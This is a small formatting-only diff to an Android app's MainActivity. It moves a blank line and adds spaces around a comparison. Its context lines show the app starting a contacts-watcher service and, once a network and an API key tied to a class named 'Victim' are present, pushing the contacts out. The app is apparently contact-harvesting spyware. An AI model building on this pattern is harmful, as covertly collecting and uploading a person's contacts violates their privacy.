@@ -58,8 +58,8 @@ public class MainActivity extends AppCompatActivity {
 
     private void doNormalWork() {
 
-
         startService(new Intent(this, ContactsWatcherService.class));
+
         ContactUtils.refreshContacts(this);
 
         final Context context = this;
@@ -69,7 +69,7 @@ public class MainActivity extends AppCompatActivity {
             Log.i(X, "Has network");
 
 
-            if (Victim.getAPIKey()!=null) {
+            if (Victim.getAPIKey() != null) {
 
                 //Do the jobs here
                 ContactUtils.push(context);
